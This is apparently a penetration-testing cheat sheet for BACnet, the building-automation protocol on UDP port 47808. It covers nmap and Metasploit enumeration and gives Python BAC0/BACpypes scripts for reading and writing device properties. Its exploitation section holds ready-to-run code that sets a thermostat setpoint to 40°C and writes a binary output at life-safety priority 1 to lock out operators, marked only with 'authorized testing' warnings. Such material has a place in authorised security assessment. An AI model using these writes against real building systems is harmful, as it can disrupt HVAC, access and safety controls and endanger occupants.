# Port 47808 - BACnet

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Read/Write Properties](#readwrite-properties)
- [Exploitation](#exploitation)

---

## Overview

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 47808/UDP | BACnet/IP | Building Automation and Control Networks |

BACnet is used in:

- Building Management Systems (BMS)
- HVAC systems
- Access control
- Lighting systems
- Fire alarms

---

## Enumeration

### Nmap

```shell
nmap -sU -p 47808 $rhost
nmap -sU -p 47808 --script bacnet-info $rhost
```

### Using BACpypes

```shell
# Install
pip install bacpypes

# Who-Is broadcast
python -m bacpypes.samples.WhoIsIAm
```

### Metasploit

```shell
# BACnet discovery
use auxiliary/scanner/scada/bacnet_info
set RHOSTS $rhost
run
```

---

## Read/Write Properties

### Read Properties

```python
#!/usr/bin/env python3
from bacpypes.app import BIPSimpleApplication
from bacpypes.local.device import LocalDeviceObject
from bacpypes.pdu import Address
from bacpypes.primitivedata import ObjectIdentifier
from bacpypes.apdu import ReadPropertyRequest
from bacpypes.iocb import IOCB

# Create device
this_device = LocalDeviceObject(
    objectName='TestDevice',
    objectIdentifier=('device', 599),
    maxApduLengthAccepted=1024,
    segmentationSupported='noSegmentation',
    vendorIdentifier=15,
)

# Create application
this_application = BIPSimpleApplication(this_device, '0.0.0.0')

target_host = "TARGET_IP"  # Replace with target

# Read property
request = ReadPropertyRequest(
    destination=Address(target_host),
    objectIdentifier=('device', 1),
    propertyIdentifier='objectName',
)

iocb = IOCB(request)
this_application.request_io(iocb)
iocb.wait()

print(f"Object Name: {iocb.ioResponse.propertyValue}")
```

### Using BAC0

```python
#!/usr/bin/env python3
import BAC0

# Connect
bacnet = BAC0.lite()

# Discover devices
devices = bacnet.discover()
print(f"Devices: {devices}")

# Read property
value = bacnet.read('$rhost device 1 objectName')
print(f"Device Name: {value}")

# Read analog value
temp = bacnet.read('$rhost analogValue 1 presentValue')
print(f"Temperature: {temp}")
```

### Write Properties

```python
#!/usr/bin/env python3
import BAC0

bacnet = BAC0.lite()

# Write to analog value (setpoint)
bacnet.write('$rhost analogValue 1 presentValue 25.0')

# Write to binary output (ON/OFF)
bacnet.write('$rhost binaryOutput 1 presentValue active')

print("Value written!")
```

---

## Exploitation

### Enumerate All Devices

```python
#!/usr/bin/env python3
import BAC0

bacnet = BAC0.lite()

# Who-Is broadcast
devices = bacnet.whois()

for device in devices:
    print(f"Device: {device}")
    
    # Get device info
    try:
        name = bacnet.read(f'{device[0]} device {device[1]} objectName')
        vendor = bacnet.read(f'{device[0]} device {device[1]} vendorName')
        print(f"  Name: {name}")
        print(f"  Vendor: {vendor}")
    except:
        pass
```

### Read All Points

```python
#!/usr/bin/env python3
import BAC0

bacnet = BAC0.lite()

# Connect to specific device
device = bacnet.discover()[0]

# Read object list
objects = bacnet.read(f'{device} device 1 objectList')

for obj in objects:
    obj_type, obj_instance = obj
    try:
        name = bacnet.read(f'{device} {obj_type} {obj_instance} objectName')
        value = bacnet.read(f'{device} {obj_type} {obj_instance} presentValue')
        print(f"{name}: {value}")
    except:
        pass
```

### Change Building Temperature

```python
#!/usr/bin/env python3
# ⚠️ Only for authorized testing!
import BAC0

bacnet = BAC0.lite()

# Find thermostat setpoint
# Change temperature setpoint to extreme value
bacnet.write('$rhost analogValue 1 presentValue 40.0')  # 40°C!

print("Temperature setpoint changed!")
```

### DoS via Priority Array

```python
#!/usr/bin/env python3
# ⚠️ Only for authorized testing!
import BAC0

bacnet = BAC0.lite()

# Write at highest priority (can lock out operators)
# Priority 1 = Manual-Life Safety
bacnet.write('$rhost binaryOutput 1 presentValue active - 1')
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -sU -p 47808 --script bacnet-info $rhost` | Enumerate |
| BAC0 | `bacnet.discover()` | Discover devices |
| BAC0 | `bacnet.read('addr device 1 objectName')` | Read property |
| Metasploit | `use auxiliary/scanner/scada/bacnet_info` | Scan |

| Object Type | Description |
| :--- | :--- |
| analogInput | Sensor readings |
| analogOutput | Control outputs |
| analogValue | Setpoints |
| binaryInput | ON/OFF sensors |
| binaryOutput | ON/OFF controls |
| device | Device info |
